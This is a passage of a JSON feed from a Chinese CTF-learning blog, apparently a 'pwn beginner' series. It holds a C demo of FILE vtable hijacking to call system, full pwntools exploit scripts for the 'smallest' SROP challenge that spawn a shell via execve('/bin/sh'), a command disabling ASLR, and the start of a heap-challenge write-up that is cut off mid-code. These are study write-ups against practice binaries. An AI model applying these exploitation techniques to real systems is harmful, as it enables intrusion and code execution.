class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> system_ptr 0x7ffff7a523a0;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">void</span>)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    FILE *fp;</span><br><span class=\"line\">    <span class=\"type\">long</span> <span class=\"type\">long</span> *vtable_addr,*fake_vtable;</span><br><span class=\"line\"></span><br><span class=\"line\">    fp=fopen(<span class=\"string\">&quot;123.txt&quot;</span>,<span class=\"string\">&quot;rw&quot;</span>);</span><br><span class=\"line\">    fake_vtable=<span class=\"built_in\">malloc</span>(<span class=\"number\">0x40</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    vtable_addr=(<span class=\"type\">long</span> <span class=\"type\">long</span> *)((<span class=\"type\">long</span> <span class=\"type\">long</span>)fp+<span class=\"number\">0xd8</span>);     <span class=\"comment\">//vtable offset</span></span><br><span class=\"line\"></span><br><span class=\"line\">    vtable_addr[<span class=\"number\">0</span>]=(<span class=\"type\">long</span> <span class=\"type\">long</span>)fake_vtable;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">memcpy</span>(fp,<span class=\"string\">&quot;sh&quot;</span>,<span class=\"number\">3</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    fake_vtable[<span class=\"number\">7</span>]=system_ptr; <span class=\"comment\">//xsputn</span></span><br><span class=\"line\"></span><br><span class=\"line\">    fwrite(<span class=\"string\">&quot;hi&quot;</span>,<span class=\"number\">2</span>,<span class=\"number\">1</span>,fp);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>​\t\t可以看到伪造效果,vtable被覆盖为堆上的地址了</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-37-IOFILE%E5%88%9D%E6%8E%A2/image-20230806114845070.png\" alt=\"image-20230806114845070\"></p>\n<p>​\t\t fake_vtable[7]&#x3D;system_ptr; 再把堆上相应内容改成system的地址就可以了</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-37-IOFILE%E5%88%9D%E6%8E%A2/image-20230806115013625.png\" alt=\"image-20230806115013625\"></p>\n<p>​\t\t本地尝试不成功,但在gdb中调试的时候是成功的,怀疑是随机化的问题,关闭随机化就可以了</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo <span class=\"number\">0</span> &gt; /proc/sys/kernel/randomize_va_space </span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-37-IOFILE%E5%88%9D%E6%8E%A2/image-20230806114653707.png\" alt=\"image-20230806114653707\"></p>\n<h1 id=\"参考链接\"><a href=\"#参考链接\" class=\"headerlink\" title=\"参考链接\"></a>参考链接</h1><p><a href=\"https://blog.csdn.net/qq_45323960/article/details/123810198\">https://blog.csdn.net/qq_45323960/article/details/123810198</a>  大部分图都是参考的这个师傅的,写得非常好! 推荐看原文</p>\n<p>ctf-wiki</p>\n<p><a href=\"https://blog.csdn.net/xy_369/article/details/130874848\">https://blog.csdn.net/xy_369/article/details/130874848</a> </p>\n",
            "tags": [
                "PWN入门"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-36-SROP/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-36-SROP/",
            "title": "pwn入门-36-SROP",
            "date_published": "2023-07-29T13:01:21.000Z",
            "content_html": "<p>基础看ctf-wiki和《权威指南pwn》</p>\n<p>出自论文: <strong><code>Framing Signals — A Return to Portable Shellcode</code></strong></p>\n<h1 id=\"理论基础\"><a href=\"#理论基础\" class=\"headerlink\" title=\"理论基础\"></a>理论基础</h1><p>32 位的 sigreturn 的调用号为 119(0x77)，64 位的系统调用号为 15(0xf)</p>\n<h2 id=\"攻击条件\"><a href=\"#攻击条件\" class=\"headerlink\" title=\"攻击条件\"></a>攻击条件</h2><p>1.栈溢出,且大小足够</p>\n<p>2.知道以下内容地址</p>\n<p>“&#x2F;bin&#x2F;sh”、signal frame、syscall、sigreturn</p>\n<p>对sigreturn, 只要rax&#x3D;15(64位下),执行syscall即可,rax可以通过一些方式来间接控制,比如作为read的返回值(读取的字节数)</p>\n<h1 id=\"例题-360-春秋杯-smallest-pwn\"><a href=\"#例题-360-春秋杯-smallest-pwn\" class=\"headerlink\" title=\"例题  360 春秋杯  smallest-pwn\"></a>例题  360 春秋杯  smallest-pwn</h1><p><img src=\"/pwn%E5%85%A5%E9%97%A8-36-SROP/image-20230729163815299.png\" alt=\"image-20230729163815299\"></p>\n<p>​\t\t这个不能用正常程序的流程来看待,就这几行汇编, 首先向栈顶读取了0x400字符,然后ret, 又会从栈顶取值作为下一条指令.</p>\n<p>​\t\t程序中没有sigreturn系统调用,但是有read,通过read可以控制rax寄存器的值, 然后再调用syscall即可,换句话说,其实可以调用任意的系统调用(不考虑其他寄存器是否满足条件)</p>\n<p>​\t\texecve(“&#x2F;bin&#x2F;sh”,0,0) 最终的目标是要执行这个, 但现在最大的问题是, <font color=\"red\">不知道”&#x2F;bin&#x2F;sh”的地址,</font>所以需要想办法泄露栈地址,然后输入到这个确定的地址上面.</p>\n<h2 id=\"攻击步骤\"><a href=\"#攻击步骤\" class=\"headerlink\" title=\"攻击步骤\"></a>攻击步骤</h2><h3 id=\"1-泄露地址\"><a href=\"#1-泄露地址\" class=\"headerlink\" title=\"1.泄露地址\"></a>1.泄露地址</h3><p>​\t\t因为ret后从rsp取值,所以rsp这里要放几个程序的起始地址start_addr,然后首先要利用write输出栈的地址,可以看到这两句指令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mov rsi,rsp</span><br><span class=\"line\">mov rdi,rax</span><br><span class=\"line\">syscall</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t如果利用之前的read把rax控制为1,那么就可以调用write的系统调用了,而rsi正好是rsp,所以可以输出一个rsp中的一个栈指针,理论上也是指向栈的某个位置.</p>\n<p>​\t\t<strong>要执行write的话,需要跳过xor这条指令,所以是不是应该在rsp上放一个0x400b3,也就是xor下一条指令的地址呢? 理论上需要,其实也不用,因为在输入一个字符的时候,可以输入\\xb3, 这样把rsp上原先存放的start_addr地址的最后一个字节改了,也可以实现这个效果</strong></p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-36-SROP/image-20230729115321236.png\" alt=\"image-20230729115321236\"></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload = p64(start_addr) * <span class=\"number\">3</span></span><br><span class=\"line\">sh.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">sh.send(<span class=\"string\">&#x27;\\xb3&#x27;</span>)</span><br><span class=\"line\">stack_addr = u64(sh.recv()[<span class=\"number\">8</span>:<span class=\"number\">16</span>])</span><br><span class=\"line\">log.success(<span class=\"string\">&#x27;leak stack addr :&#x27;</span> + <span class=\"built_in\">hex</span>(stack_addr))</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t在输出的时候可以看到第二个地址才是栈上地址,所以取值[8:16], <strong>为啥rsp上面要放3三个初始地址呢?</strong></p>\n<p>​\t\t第一个用来读入 \\xb3,  第二个时 进入了write,泄露地址, 第三个该继续走下面流程了</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-36-SROP/image-20230729164917698.png\" alt=\"image-20230729164917698\"></p>\n<p>​\t\t</p>\n<h3 id=\"2-构造frame-实现读入已知地址的功能\"><a href=\"#2-构造frame-实现读入已知地址的功能\" class=\"headerlink\" title=\"2.构造frame: 实现读入已知地址的功能\"></a>2.构造frame: 实现读入已知地址的功能</h3><p>​\t\t刚开始非常纳闷…这段汇编给的就是read的汇编,为啥要用frame构造啊….<font color=\"red\">后来想明白后,还是自己太想当然了,前面给的read的汇编是不知道rsp的地址的,通过构造的frame,在恢复的时候,可以指定rsp的值,这样才能知道&#x2F;bin&#x2F;sh的地址(或许可以暴力破解?</font></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sigframe = SigreturnFrame()</span><br><span class=\"line\">sigframe.rax = constants.SYS_read</span><br><span class=\"line\">sigframe.rdi = <span class=\"number\">0</span></span><br><span class=\"line\">sigframe.rsi = stack_addr</span><br><span class=\"line\">sigframe.rdx = <span class=\"number\">0x400</span></span><br><span class=\"line\">sigframe.rsp = stack_addr</span><br><span class=\"line\">sigframe.rip = syscall_ret</span><br><span class=\"line\">payload = p64(start_addr) + <span class=\"string\">&#x27;a&#x27;</span> * <span class=\"number\">8</span> + <span class=\"built_in\">str</span>(sigframe)</span><br><span class=\"line\">sh.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">## set rax=15 and call sigreturn</span></span><br><span class=\"line\">sigreturn = p64(syscall_ret) + <span class=\"string\">&#x27;b&#x27;</span> * <span class=\"number\">7</span></span><br><span class=\"line\">sh.send(sigreturn)</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t7个b不会影响吗??? 会覆盖sigframe的开头,<font color=\"red\">但是不知道覆盖的哪个寄存器????,不过看结果是没影响的</font></p>\n<h3 id=\"3-读如execve的frame-然后执行\"><a href=\"#3-读如execve的frame-然后执行\" class=\"headerlink\" title=\"3. 读如execve的frame,然后执行\"></a>3. 读如execve的frame,然后执行</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sigframe = SigreturnFrame()</span><br><span class=\"line\">sigframe.rax = constants.SYS_execve</span><br><span class=\"line\">sigframe.rdi = stack_addr + <span class=\"number\">0x120</span>  <span class=\"comment\"># &quot;/bin/sh&quot; &#x27;s addr</span></span><br><span class=\"line\">sigframe.rsi = <span class=\"number\">0x0</span></span><br><span class=\"line\">sigframe.rdx = <span class=\"number\">0x0</span></span><br><span class=\"line\">sigframe.rsp = stack_addr</span><br><span class=\"line\">sigframe.rip = syscall_ret</span><br><span class=\"line\">frame_payload = p64(start_addr) + <span class=\"string\">b&quot;b&quot;</span>*<span class=\"number\">8</span> + <span class=\"built_in\">bytes</span>(sigframe)</span><br><span class=\"line\">payload = frame_payload + (<span class=\"number\">0x120</span>-<span class=\"built_in\">len</span>(frame_payload))*<span class=\"string\">b&#x27;\\x00&#x27;</span>+<span class=\"string\">b&#x27;/bin/sh\\x00&#x27;</span></span><br><span class=\"line\">sh.send(payload)</span><br><span class=\"line\">sh.send(sigreturn)</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t与2原理一样,读入frame,然后执行</p>\n<h2 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">small = ELF(<span class=\"string\">&#x27;./smallest&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> args[<span class=\"string\">&#x27;REMOTE&#x27;</span>]:</span><br><span class=\"line\">    sh = remote(<span class=\"string\">&#x27;127.0.0.1&#x27;</span>, <span class=\"number\">7777</span>)</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">    sh = process(<span class=\"string\">&#x27;./smallest&#x27;</span>)</span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>, <span class=\"string\">&#x27;splitw&#x27;</span>, <span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\">gdb.attach(sh)</span><br><span class=\"line\">context.arch = <span class=\"string\">&#x27;amd64&#x27;</span></span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">syscall_ret = <span class=\"number\">0x00000000004000BE</span></span><br><span class=\"line\">start_addr = <span class=\"number\">0x00000000004000B0</span></span><br><span class=\"line\">payload = p64(start_addr) * <span class=\"number\">3</span></span><br><span class=\"line\"></span><br><span class=\"line\">sh.send(payload)</span><br><span class=\"line\">pause()</span><br><span class=\"line\">sh.send(<span class=\"string\">&quot;\\xb3&quot;</span>)</span><br><span class=\"line\">stack_addr = u64(sh.recv()[<span class=\"number\">8</span>:<span class=\"number\">16</span>])</span><br><span class=\"line\">log.success(<span class=\"string\">&#x27;leak stack addr :&#x27;</span> + <span class=\"built_in\">hex</span>(stack_addr))</span><br><span class=\"line\"></span><br><span class=\"line\">sigframe = SigreturnFrame()</span><br><span class=\"line\">sigframe.rax = constants.SYS_read</span><br><span class=\"line\">sigframe.rdi = <span class=\"number\">0</span></span><br><span class=\"line\">sigframe.rsi = stack_addr</span><br><span class=\"line\">sigframe.rdx = <span class=\"number\">0x400</span></span><br><span class=\"line\">sigframe.rsp = stack_addr</span><br><span class=\"line\">sigframe.rip = syscall_ret</span><br><span class=\"line\">payload = p64(start_addr) + <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">8</span> + <span class=\"built_in\">bytes</span>(sigframe)</span><br><span class=\"line\">sh.send(payload)</span><br><span class=\"line\">sigreturn = p64(syscall_ret) + <span class=\"string\">b&quot;b&quot;</span>*<span class=\"number\">7</span></span><br><span class=\"line\">pause()</span><br><span class=\"line\">sh.send(sigreturn)</span><br><span class=\"line\"></span><br><span class=\"line\">sigframe = SigreturnFrame()</span><br><span class=\"line\">sigframe.rax = constants.SYS_execve</span><br><span class=\"line\">sigframe.rdi = stack_addr + <span class=\"number\">0x120</span>  <span class=\"comment\"># &quot;/bin/sh&quot; &#x27;s addr</span></span><br><span class=\"line\">sigframe.rsi = <span class=\"number\">0x0</span></span><br><span class=\"line\">sigframe.rdx = <span class=\"number\">0x0</span></span><br><span class=\"line\">sigframe.rsp = stack_addr</span><br><span class=\"line\">sigframe.rip = syscall_ret</span><br><span class=\"line\">pause()</span><br><span class=\"line\">frame_payload = p64(start_addr) + <span class=\"string\">b&quot;b&quot;</span>*<span class=\"number\">8</span> + <span class=\"built_in\">bytes</span>(sigframe)</span><br><span class=\"line\">payload = frame_payload + (<span class=\"number\">0x120</span>-<span class=\"built_in\">len</span>(frame_payload))*<span class=\"string\">b&#x27;\\x00&#x27;</span>+<span class=\"string\">b&#x27;/bin/sh\\x00&#x27;</span></span><br><span class=\"line\">sh.send(payload)</span><br><span class=\"line\">pause()</span><br><span class=\"line\">sh.send(sigreturn)</span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"暴力破解解法\"><a href=\"#暴力破解解法\" class=\"headerlink\" title=\"暴力破解解法\"></a>暴力破解解法</h2><p>​\t\t不过这个解法也是基于在本地能大概看一下偏移差多少的情况下，如果直接暴力破解的话，难度应该会更大一点</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-36-SROP/image-20230729210328031.png\" alt=\"image-20230729210328031\"></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">small = ELF(<span class=\"string\">&#x27;./smallest&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">sh = process(<span class=\"string\">&#x27;./smallest&#x27;</span>)</span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>, <span class=\"string\">&#x27;splitw&#x27;</span>, <span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(sh)</span></span><br><span class=\"line\">context.arch = <span class=\"string\">&#x27;amd64&#x27;</span></span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">syscall_ret = <span class=\"number\">0x00000000004000BE</span></span><br><span class=\"line\">start_addr = <span class=\"number\">0x00000000004000B0</span></span><br><span class=\"line\">payload = p64(start_addr) * <span class=\"number\">3</span></span><br><span class=\"line\"></span><br><span class=\"line\">sh.send(payload)</span><br><span class=\"line\"><span class=\"comment\">#pause()</span></span><br><span class=\"line\">sh.send(<span class=\"string\">b&quot;\\xb3&quot;</span>)</span><br><span class=\"line\">stack_addr = u64(sh.recv()[<span class=\"number\">8</span>:<span class=\"number\">16</span>])</span><br><span class=\"line\">log.success(<span class=\"string\">&#x27;leak stack addr :&#x27;</span> + <span class=\"built_in\">hex</span>(stack_addr))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">sigreturn = p64(syscall_ret) + <span class=\"string\">b&quot;b&quot;</span>*<span class=\"number\">7</span></span><br><span class=\"line\"></span><br><span class=\"line\">sigframe = SigreturnFrame()</span><br><span class=\"line\">sigframe.rax = constants.SYS_execve</span><br><span class=\"line\">sigframe.rdi = stack_addr  -<span class=\"number\">0xa1f</span>  <span class=\"comment\"># &quot;/bin/sh&quot; &#x27;s addr</span></span><br><span class=\"line\">sigframe.rsi = <span class=\"number\">0x0</span></span><br><span class=\"line\">sigframe.rdx = <span class=\"number\">0x0</span></span><br><span class=\"line\">sigframe.rsp = stack_addr</span><br><span class=\"line\">sigframe.rip = syscall_ret</span><br><span class=\"line\">frame_payload = p64(start_addr) + <span class=\"string\">b&quot;c&quot;</span>*<span class=\"number\">8</span> + <span class=\"built_in\">bytes</span>(sigframe)</span><br><span class=\"line\">payload = frame_payload + <span class=\"string\">b&#x27;/bin/sh\\x00&#x27;</span>*<span class=\"number\">90</span></span><br><span class=\"line\"><span class=\"comment\">#pause()</span></span><br><span class=\"line\">sh.send(payload)</span><br><span class=\"line\">sh.send(sigreturn)</span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h2 id=\"其他\"><a href=\"#其他\" class=\"headerlink\" title=\"其他\"></a>其他</h2><p>gdb中如何查看 sigframe结构?</p>\n<p>gdb查看结构体信息</p>\n<p><a href=\"https://wizardforcel.gitbooks.io/100-gdb-tips/content/set-print-pretty-on.html\">https://wizardforcel.gitbooks.io/100-gdb-tips/content/set-print-pretty-on.html</a></p>\n",
            "tags": [
                "PWN入门"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-35-7%E6%9C%88%E6%9C%88%E8%B5%9Bpwn/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-35-7%E6%9C%88%E6%9C%88%E8%B5%9Bpwn/",
            "title": "pwn入门-35-7月月赛pwn",
            "date_published": "2023-07-28T10:43:04.000Z",
            "content_html": "<p>题目链接: 本链接+&#x2F;pwn</p>\n<p>​\t\t一上来能看到是一个很明显的菜单堆题,并且有后门函数,很明显要劫持控制流,执行后门函数,但问题是没找到通用的漏洞,但是能看到add中,有很大一串逻辑,后来也看到了这里有关于后门函数的操作,以及存放puts函数的地址. </p>\n<p>​\t\t确定思路大概是想办法操作堆块位置,布置好位置,把后门函数放到puts函数的位置,然后调用就可以了.</p>\n<p>​\t\t不过后面看这逻辑看迷糊了….其实挺简单的逻辑, <font color=\"red\">注意两点,一点是可以辅助画图,来帮助自己分析,另外一点是通过调试来帮助自己分析, 只用脑子想…脑子可能不太够用..</font></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">unsigned</span> __int64 <span class=\"title function_\">add</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">....</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;size:&quot;</span>);</span><br><span class=\"line\">  size = <span class=\"number\">0</span>;</span><br><span class=\"line\">  __isoc99_scanf(<span class=\"string\">&quot;%u&quot;</span>, &amp;size);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( size &lt;= <span class=\"number\">0x200</span> &amp;&amp; size &gt; <span class=\"number\">7</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> ( size_4 = <span class=\"number\">0</span>; size_4 &lt;= <span class=\"number\">1</span>; ++size_4 )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( !*((_QWORD *)&amp;ptrs + <span class=\"number\">2</span> * size_4) )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        dword_4068[<span class=\"number\">4</span> * size_4] = size;</span><br><span class=\"line\">        *((_QWORD *)&amp;ptrs + <span class=\"number\">2</span> * size_4) = <span class=\"built_in\">malloc</span>(size);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( !*((_QWORD *)&amp;ptrs + <span class=\"number\">2</span> * size_4) )</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;malloc error&quot;</span>);</span><br><span class=\"line\">          <span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        **((_QWORD **)&amp;ptrs + <span class=\"number\">2</span> * size_4) = &amp;<span class=\"built_in\">puts</span>;</span><br><span class=\"line\">        <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;content:&quot;</span>);</span><br><span class=\"line\">        v7 = read(<span class=\"number\">0</span>, (<span class=\"type\">void</span> *)(*((_QWORD *)&amp;ptrs + <span class=\"number\">2</span> * size_4) + <span class=\"number\">8LL</span>), size - <span class=\"number\">8</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( v7 &gt; <span class=\"number\">0</span> )</span><br><span class=\"line\">          *(_BYTE *)(v7 + <span class=\"number\">7LL</span> + *((_QWORD *)&amp;ptrs + <span class=\"number\">2</span> * size_4)) = <span class=\"number\">0</span>;</span><br><span class=\"line\">        v1 = *(_WORD *)(v7 + <span class=\"number\">14LL</span> + *((_QWORD *)&amp;ptrs + <span class=\"number\">2</span> * size_4));</span><br><span class=\"line\">        v8 = magicffff;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( v1 == <span class=\"number\">8995</span> )</span><br><span class=\"line\">          v8 = *(<span class=\"type\">unsigned</span> __int64 (**)())(v7 + <span class=\"number\">8LL</span> + *((_QWORD *)&amp;ptrs + <span class=\"number\">2</span> * size_4));</span><br><span class=\"line\">        <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt;= <span class=\"number\">7</span>; ++i )</span><br><span class=\"line\">          *(_BYTE *)(v7 + (__int64)i + <span class=\"number\">8</span> + *((_QWORD *)&amp;ptrs + <span class=\"number\">2</span> * size_4)) = ((__int64)v8 &gt;&gt; (<span class=\"number\">8</span> * (<span class=\"type\">unsigned</span> __int8)i)) ^ <span class=\"number\">0x23</span>;</span><br><span class=\"line\">        v2 = *(_WORD *)(v7 + <span class=\"number\">22LL</span> + *((_QWORD *)&amp;ptrs + <span class=\"number\">2</span> * size_4));</span><br><span class=\"line\">        v8 = magicffff;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( v2 == <span class=\"number\">12850</span> )</span><br><span class=\"line\">          v8 = *(<span class=\"type\">unsigned</span> __int64 (**)())(v7 + <span class=\"number\">16LL</span> + *((_QWORD *)&amp;ptrs + <span class=\"number\">2</span> * size_4));</span><br><span class=\"line\">        <span class=\"keyword\">for</span> ( j = <span class=\"number\">0</span>; j &lt;= <span class=\"number\">7</span>; ++j )</span><br><span class=\"line\">          *(_BYTE *)(v7 + (__int64)j + <span class=\"number\">16</span> + *((_QWORD *)&amp;ptrs + <span class=\"number\">2</span> * size_4)) = ((__int64)v8 &gt;&gt; (<span class=\"number\">8</span> * (<span class=\"type\">unsigned</span> __int8)j)) ^ <span class=\"number\">0x32</span>;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> __readfsqword(<span class=\"number\">0x28</span>u) ^ v9;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> __readfsqword(<span class=\"number\">0x28</span>u) ^ v9;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>​\t\t比较关键的几条语句如下:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">**((_QWORD **)&amp;ptrs + <span class=\"number\">2</span> * size_4) = &amp;<span 